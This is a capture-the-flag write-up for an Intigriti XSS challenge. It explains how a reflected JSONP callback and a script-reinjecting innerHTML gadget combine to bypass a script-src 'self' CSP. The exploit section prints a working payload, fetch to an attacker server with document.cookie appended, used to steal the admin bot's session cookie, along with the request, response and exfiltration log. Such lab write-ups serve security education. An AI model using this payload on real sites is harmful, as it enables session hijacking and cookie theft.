# Intigriti's February challenge 0226 by [d3dn0v4](https://x.com/d3dn0v4)

## Description 

The solution:

* Should leverage a **XSS** vulnerability on the challenge page.
* Shouldn't be **self-XSS** or related to **MiTM** attacks.
* Should work in the latest version of Google Chrome.
* Should include:
    * The flag in the format **INTIGRITI{.*}**
    * The payload(s) used
    * Steps to solve (short description / bullet points)
* Should be reported on the Intigriti platform.

Get started:

1. Download the [challenge source code](https://challenge-0226.intigriti.io/static/source.zip)
2. Solve it locally!
3. Repeat your attack against the [challenge page](https://challenge-0226.intigriti.io/challenge) & let's capture that flag!

## TL;DR

* The application exposes a vulnerable `/api/jsonp` endpoint that reflects the callback parameter directly into executable JavaScript:
    ```javascript
    response = f"{callback}({json.dumps(user_data)})"
    ```

* By supplying `?callback=function(<args>)//`, the JSON payload can be commented out, allowing arbitrary JavaScript execution;

* A malicious post is created containing:

    ```javascript
    <script src="/api/jsonp?callback=fetch('https://<attacker-server>?'%2Bdocument.cookie)//"></script>
    ```

* Due to a **DOM-based XSS** in `/app/static/js/preview.js` (innerHTML + script reinjection), the payload is injected and executed;

* Although a **CSP** is present `(script-src 'self')`, `connect-src *` allows outbound requests;

* When the post is reported, the admin bot loads it, executes the payload, and exfiltrates its cookies (including the flag) to the attacker-controlled server.


## Analysis

The target is a web application that allows users to freely publish their favourite ~~XSS payloads~~, profound literary reflections and thoughts on the misery of the human condition ✒️🪶🖋️.

![ralph](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExNDF6bng5eGt4MHFsbm1oYzB3YjR2bDRoOGgzcjFhcThxb3JvbXpjcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xT5LMI5WLGkftxKJeE/giphy.gif)

![home](./imgs/home.png)

Seized by a sudden artistic impulse, I decide that I too want to be part of it all and sign up so that I can give free rein to my creativity.

![new_post](./imgs/new_post.png)

But before diving headfirst into writing, I thought it might be very useful to read the source a little and see if it could help me focus my writing on something *appropriately expressive*.

![homer_reading](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNXE3NTAyOXpscng1aWs0aWF1a2Z6cnozMGdxODAzaGpjMXMya2djZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/xT5LMEIXe6RgCUuDcI/giphy.gif)

The backend is written in **Flask** and exposes several interesting endpoints, including the following:

```python
@app.route('/post/new', methods=['GET', 'POST'])
@login_required
def post_new():
    if request.method == 'POST':
        title = request.form.get('title', '').strip()
        content = request.form.get('content', '').strip()
        
        if not title or not content:
            flash('Title and content required.', 'error')
            return render_template('post_new.html')
        
        post = Post(
            title=title,
            content=content,
            author_id=session['user_id']
        )
        db.session.add(post)
        db.session.commit()
        
        flash('Post created!', 'success')
        return redirect(url_for('post_view', post_id=post.id))
```

Newly created posts are not properly sanitised: user-supplied `title` and `content` are stored without any security filtering.
Nothing particularly noteworthy, it seems.

Digging deeper, we can see that the backend provides several utility functionalities under the `/api/` path, such as:

```python
@app.route('/api/render')
def api_render():
    post_id = request.args.get('id')
    if not post_id:
        return jsonify({'error': 'Missing id'}), 400
    
    post = Post.query.get(post_id)
    if not post:
        return jsonify({'error': 'Not found'}), 404
    
    rendered_html = render_markdown(post.content)
    
    return jsonify({
        'id': post.id,
        'title': post.title,
        'html': rendered_html,
        'author': post.author.username,
        'rendered_at': time.time()
    })
    ...
    def render_markdown(content):
    html_content = content
    html_content = re.sub(r'^### (.+)$', r'<h3>\1</h3>', html_content, flags=re.MULTILINE)
    html_content = re.sub(r'^## (.+)$', r'<h2>\1</h2>', html_content, flags=re.MULTILINE)
    html_content = re.sub(r'^# (.+)$', r'<h1>\1</h1>', html_content, flags=re.MULTILINE)
    html_content = re.sub(r'\*\*(.+?)\*\*', r'<strong>\1</strong>', html_content)
    html_content = re.sub(r'\*(.+?)\*', r'<em>\1</em>', html_content)
    html_content = re.sub(r'\[(.+?)\]\((.+?)\)', r'<a href="\2">\1</a>', html_content)
    html_content = html_content.replace('\n\n', '</p><p>')
    html_content = f'<p>{html_content}</p>'
    return html_content
```

The application renders user-supplied Markdown content without performing any form of HTML sanitisation or output encoding, allowing arbitrary HTML and JavaScript to be stored and potentially executed in the browser.

Another particularly interesting endpoint is the following:

```python
@app.route('/api/jsonp')
def api_jsonp():
    callback = request.args.get('callback', 'handleData')
    
    if '<' in callback or '>' in callback:
        callback = 'handleData'
    
    user_data = {
        'authenticated': 'user_id' in session,
        'timestamp': time.time()
    }
    
    if 'user_id' in session:
        user = User.query.get(session['user_id'])
        if user:
            user_data['username'] = user.username
    
    response = f"{callback}({json.dumps(user_data)})"
    return Response(response, mimetype='application/javascript')
```

**JSONP (JSON with Padding)** is a legacy technique used to bypass browser-enforced **Same-Origin Policy (SOP)** restrictions on cross-origin requests, back when **Cross-Origin Resource Sharing (CORS)** did not yet exist — and when **“vibe coding”** simply meant writing code while listening to something cool in the background (see [Modjo - Lady (Hear Me Tonight)](https://www.youtube.com/watch?v=mMfxI3r_LyA)).

Browsers normally block **fetch** or **XMLHttpRequest** calls from one domain to another **(cross-origin)** for security.

`<script>` tags, however, are not restricted by **SOP**: they can load scripts from any domain.

**JSONP** works by returning executable JavaScript rather than raw JSON; the client provides the callback function name as a query parameter, and the server reflects this value directly into the response, wrapping the JSON payload inside a dynamically generated function call.

The client code responsible for rendering and displaying user posts is partially presented below and comes from `/app/static/js/preview.js`.

And now — assuming you actually clicked the link and let the iconic intro play — we should be right about at the moment when the singer finally comes in with that unmistakable ***“Lady…”***.
Perfect timing, because this is where things start to get interesting:

```javascript
fetch('/api/render?id=' + postId)
        .then(function(response) {
            if (!response.ok) throw new Error('Failed to load');
            return response.json();
        })
        .then(function(data) {
            const preview = document.getElementById('preview');
            preview.innerHTML = data.html;
            processContent(preview);
        })
        .catch(function(error) {
            document.getElementById('preview').innerHTML = '<p class="error">Failed to load content.</p>';
        });
    
    function processContent(container) {
        const codeBlocks = container.querySelectorAll('pre code');
        codeBlocks.forEach(function(block) {
            block.classList.add('highlighted');
        });
        
        const scripts = container.querySelectorAll('script');
        scripts.forEach(function(script) {
            if (script.src && script.src.includes('/api/')) {
                const newScript = document.createElement('script');
                newScript.src = script.src;
                document.body.appendChild(newScript);
            }
        });
    }
``` 

The application fetches user-submitted post content from `/api/render` on the client-side and inserts it directly into the **DOM** using `innerHTML`. 
It then processes code blocks for highlighting and reinjects any `<script src="/api/...">` tags.

*"...And I know that is true, I can tell by the look in your **if**..."*

## Exploit

The target is vulnerable to **DOM-based XSS** due to the way it handles user‑controlled HTML and script elements in the front‑end rendering flow.

The vulnerable behaviour occurs in two steps:

1. Unsanitized user HTML is written directly to `innerHTML`:
    ```javascript
    preview.innerHTML = data.html;
    ```
    * the value of `data.html` comes from user-generated posts and is inserted directly into the **DOM** without any sanitisation or escaping;
    * this makes the **innerHTML** assignment a **DOM sink**, allowing an attacker to inject arbitrary HTML, including `<script>`.

2. `processContent()` actively re‑injects attacker‑supplied scripts into the live **DOM**:
    * after rendering the HTML, the code searches for any `<script>` elements inside the untrusted content;
    * this logic takes any script with a `src` attribute containing `/api/` and:
        * creates a new real `<script>` element;
        * copies the attacker‑controlled URL into `newScript.src`;
        * appends it to the page, forcing the browser to load and execute it.

This **“script reinjection”** behaviour acts as an **XSS gadget** forming a mandatory path for exploiting **DOM-based XSS** in the application.

The application also enforces a **Content Security Policy (CSP)**:

    Content-Security-Policy: script-src 'self';

* inline scripts cannot be executed;
* scripts are restricted to same-origin sources.

However, good news, the **CSP** does not restrict outgoing network requests:

    Content-Security-Policy: connect-src *;

This means that, while arbitrary script execution is blocked, attacker-controlled scripts loaded from allowed sources can still make requests to external domains, enabling data exfiltration.

The final link in the attack chain is identifying a way to inject arbitrary JavaScript payloads while ensuring they are loaded from a same-origin source. Any ideas?

Returning to our artistic vein, we face the timeless dilemma: 

***"to JSONP or not to JSONP — that is the question.***

![Shakespeare](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExZDBuajRzc3pud3RqOHloNG1xNTVvcGhuNzQyMnNneHRjd21wYXY0ayZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/F2TGh14VQFCxpAYeQd/giphy.gif)


Yes, I did give you a small hint.

Recall that the `/api/jsonp` endpoint reflects the `?callback` query parameter directly into the response without proper sanitization. This behavior can be leveraged to inject a malicious script URL that will subsequently be loaded and executed by the vulnerable `processContent()` function.

To successfully exploit this, it is necessary to break out of the default `user_data` JSON string that is embedded in the response. 
This can be achieved by crafting a request such as the following:
```http
GET /api/jsonp?callback=fetch('https://attacker-server?'%2Bdocument.cookie)// HTTP/2
```

which results in the following response:

```http
HTTP/2 200 OK
Date: Tue, 24 Feb 2026 19:26:19 GMT
Content-Type: application/javascript; charset=utf-8
Content-Length: 134
Vary: Cookie
Access-Control-Allow-Origin: *
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
```javascript
fetch('https://attacker-server?'+document.cookie)//({"authenticated": true, "timestamp": 1771961179.5332115, "username": "test_user"})
```

By creating a post containing the following payload:

```html
<script src="/api/jsonp?callback=fetch('https://<attacker-server>?'%2Bdocument.cookie)//"</script>
```

it is possible to trigger the vulnerable script reinjection logic within `processContent()`. As a result, the browser loads and executes the script from `/api/jsonp`, where the callback parameter is fully attacker-controlled.

When a victim views the malicious post, their browser executes the injected script in the context of the application. 
The crafted callback forces a request to the attacker-controlled server, appending `document.cookie` to the URL. 
Consequently, the victim’s cookies — including active session tokens — are exfiltrated.

In essence, the **JSONP** endpoint becomes a **same-origin Trojan horse**: seemingly legitimate, but carrying attacker-controlled JavaScript past the **CSP** gates.

![trojan_horse](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3NkNndod2JrbnY5eXl5aWZ0eWxid3F5emF0cWhudzhsMzIydzhuYiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/26ueZ7bYkDQ4YeHx6/giphy.gif)

After reporting the post containing the malicious payload to the challenge bot via `/report/<post_id>`, the bot visits the page and triggers the exploit.
As confirmed by the attacker-controlled server logs, the bot’s request includes the exfiltrated cookies — revealing the flag contained within the session:

```
127.0.0.1 - - [24/Feb/2026 19:28:37] "OPTIONS /?flag=INTIGRITI{019c668f-bf9f-70e8-b793-80ee7f86e00b} HTTP/1.1" 501 -
```
